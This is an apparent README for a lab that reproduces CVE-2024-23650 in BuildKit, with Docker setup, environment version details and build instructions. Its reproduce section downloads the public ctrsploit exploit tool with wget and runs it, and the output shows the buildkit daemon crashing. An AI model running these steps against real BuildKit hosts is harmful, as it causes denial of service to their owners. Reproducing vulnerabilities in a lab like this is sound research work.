# containerd CVE-2024-23650

* dqd:
  * ssst0n3/docker_archive:cve-2024-23650 -> ssst0n3/docker_archive:cve-2024-23650_v0.1.0
  * ssst0n3/docker_archive:cve-2024-23650_v0.1.0
* ctr:
  * ssst0n3/docker_archive:ctr_cve-2024-23650 -> ssst0n3/docker_archive:ctr_cve-2024-23650_v0.1.0
  * ssst0n3/docker_archive:ctr_cve-2024-23650_v0.1.0

## usage

```shell
$ cd vul/cve-2024-23650
$ docker compose -f docker-compose.yml -f docker-compose.kvm.yml up -d
```

### reproduce

```shell
$ ./ssh
root@cve-2024-23650:~# wget https://github.com/ctrsploit/ctrsploit/releases/latest/download/ctrsploit_linux_amd64 -O /usr/bin/ctrsploit
root@cve-2024-23650:~# chmod +x /usr/bin/ctrsploit
root@cve-2024-23650:~# systemctl status buildkit
● buildkit.service - BuildKit
     Loaded: loaded (/usr/local/lib/systemd/system/buildkit.service; enabled; preset: enabled)
     Active: active (running) since Tue 2025-08-26 11:40:16 UTC; 29s ago
TriggeredBy: ● buildkit.socket
       Docs: https://github.com/moby/buildkit
   Main PID: 460 (buildkitd)
      Tasks: 8 (limit: 2329)
     Memory: 7.2M (peak: 8.0M)
        CPU: 18ms
     CGroup: /system.slice/buildkit.service
             └─460 /usr/local/bin/buildkitd --addr fd://

...
root@cve-2024-23650:~# ctrsploit vul 23650 x
ERRO[0020] failed to receive status: rpc error: code = Unavailable desc = error reading from server: EOF 
FATA[0020] failed to receive status: rpc error: code = Unavailable desc = error reading from server: EOF 
root@cve-2024-23650:~# systemctl status buildkit
× buildkit.service - BuildKit
     Loaded: loaded (/usr/local/lib/systemd/system/buildkit.service; enabled; preset: enabled)
     Active: failed (Result: exit-code) since Tue 2025-08-26 11:41:08 UTC; 2s ago
   Duration: 51.565s
TriggeredBy: ● buildkit.socket
       Docs: https://github.com/moby/buildkit
    Process: 460 ExecStart=/usr/local/bin/buildkitd --addr fd:// (code=exited, status=2)
   Main PID: 460 (code=exited, status=2)
        CPU: 40ms
...
```


### env details

```shell
$ ./ssh
root@cve-2024-23650:~# buildkitd --version
buildkitd github.com/moby/buildkit v0.12.4 833949d0f7908608b00ab6b93b8f92bdb147fcca
root@cve-2024-23650:~# runc --version
runc version 1.1.7
commit: v1.1.7-0-g860f061b
spec: 1.0.2-dev
go: go1.20.3
libseccomp: 2.5.4
root@cve-2024-23650:~# systemctl status buildkit
● buildkit.service - BuildKit
     Loaded: loaded (/usr/local/lib/systemd/system/buildkit.service; enabled; preset: enabled)
     Active: active (running) since Thu 2025-08-28 03:29:00 UTC; 1min 16s ago
TriggeredBy: ● buildkit.socket
       Docs: https://github.com/moby/buildkit
   Main PID: 288 (buildkitd)
      Tasks: 9 (limit: 2329)
     Memory: 36.9M (peak: 37.1M)
        CPU: 55ms
     CGroup: /system.slice/buildkit.service
             └─288 /usr/local/bin/buildkitd --addr fd://

Aug 28 03:28:59 cve-2024-23650 systemd[1]: Starting buildkit.service - BuildKit...
Aug 28 03:29:00 cve-2024-23650 buildkitd[288]: time="2025-08-28T03:29:00Z" level=info msg="auto snapshotter: using overlayfs"
Aug 28 03:29:00 cve-2024-23650 buildkitd[288]: time="2025-08-28T03:29:00Z" level=warning msg="using host network as the default"
Aug 28 03:29:00 cve-2024-23650 buildkitd[288]: time="2025-08-28T03:29:00Z" level=warning msg="git source cannot be enabled: failed to find git binary: exec: \"git\": executable file not found in $PATH"
Aug 28 03:29:00 cve-2024-23650 buildkitd[288]: time="2025-08-28T03:29:00Z" level=info msg="found worker \"zs04vgcxh1pzejmw1pz0ovjbf\", labels=map[org.mobyproject.buildkit.worker.executor:oci org.mobyproject.buildkit.worker.hostname:cve-20
24-23650 org.mobyproject.buildkit.worker.network:host org.mobyproject.buildkit.worker.oci.process-mode:sandbox org.mobyproject.buildkit.worker.selinux.enabled:false org.mobyproject.buildkit.worker.snapshotter:overlayfs], platforms=[linux/
amd64 linux/386]"
Aug 28 03:29:00 cve-2024-23650 buildkitd[288]: time="2025-08-28T03:29:00Z" level=warning msg="skipping containerd worker, as \"/run/containerd/containerd.sock\" does not exist"
Aug 28 03:29:00 cve-2024-23650 buildkitd[288]: time="2025-08-28T03:29:00Z" level=info msg="found 1 workers, default=\"zs04vgcxh1pzejmw1pz0ovjbf\""
Aug 28 03:29:00 cve-2024-23650 buildkitd[288]: time="2025-08-28T03:29:00Z" level=warning msg="currently, only the default worker can be used."
Aug 28 03:29:00 cve-2024-23650 systemd[1]: Started buildkit.service - BuildKit.
Aug 28 03:29:00 cve-2024-23650 buildkitd[288]: time="2025-08-28T03:29:00Z" level=info msg="running server on /run/buildkit/buildkitd.sock"
```

## build

```shell
make all DIR=vul/cve-2024-23650
```

for developers:

```dockerfile
FROM ssst0n3/docker_archive:ctr_cve-2024-23650_v0.1.0
```
